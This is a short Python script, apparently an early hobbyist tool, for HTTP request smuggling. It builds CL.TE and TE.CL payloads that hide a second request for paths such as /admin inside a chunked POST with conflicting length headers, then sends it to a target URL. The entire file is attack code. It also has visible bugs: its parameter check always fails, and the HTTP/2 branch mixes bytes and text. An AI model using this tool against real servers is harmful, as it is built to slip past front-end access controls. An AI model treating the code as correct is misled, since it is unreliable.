import sys
import urllib.parse
import urllib.request
import urllib.error


class HttpSmuggler:
    def __init__(self):
        self.args = sys.argv[1:]
        self.exploit_type = None
        self.url = None
        self.protocol = None

        for i, arg in enumerate(self.args):
            if(arg == '-u' or arg == '--url'):
                self.url = self.args[i+1]
            elif(arg == '-expt' or arg == '--exploit-type'):
                self.exploit_type = self.args[i+1]
            elif(arg == '-p' or arg == '--protocol'):
                self.protocol = self.args[i+1]
            elif(arg == '-h' or arg == '--help'):
                print(
                    "\n\tHttpSmuggler V0.0.1\n"+
                    "[ --url || -u ] = IP address of the url you would inject\n"+
                    "[ --protocol || -p ] = HTTP1 || HTTP2.\n"+
                    "[ --help || -h ] = Show this bro.\n"
                )
        if(self.url==None or self.exploit_type == None or self.protocol == None or self.protocol != "HTTP1" or self.protocol != 'HTTP2'):
            raise ValueError("Mismatching expected values from parameters.")

    def build_req(self):
        values = None
        if self.exploit_type == 'CLTE' and self.protocol == 'HTTP1':
            payload = "GET /admin HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1"
            values:bytes = bytes("0\r\n"+payload+"\r\n0\r\n\r\n", 'ascii')
            CL = len(values)
        elif self.exploit_type == 'TECL' and self.protocol == 'HTTP1':
            payload = "GET /layout/warehouse3d/1 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1"
            TE = hex(len(payload)).removeprefix("0x")
            values = bytes(TE+'\r\n'+payload+'\r\n0\r\n\r\n', 'ascii')
            CL = 4            
        elif self.exploit_type == 'H2CL' and self.protocol == 'HTTP2':
            payload = b""
            values = b"0\r\n"+payload+"\r\n"




        self.req = urllib.request.Request(url=self.url, data=values, method='POST')

        self.req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        self.req.add_header('Content-Length', CL)
        self.req.add_header('Transfer-Encoding', 'chunked')
        self.req.timeout = 8

    def inject(self):
        self.build_req()
        print("--------------------------------------------------")
        print('Payload: ',self.req.data)
        print('Headers: ',self.req.headers)
        print("--------------------------------------------------")
        try:
            with urllib.request.urlopen(self.req) as response:
                readata = response.read()
                print(readata)
        except urllib.error.HTTPError as Error:
            print(Error)   
            print(Error.info())
            print(Error.read())   

smuggler = HttpSmuggler()
smuggler.inject()
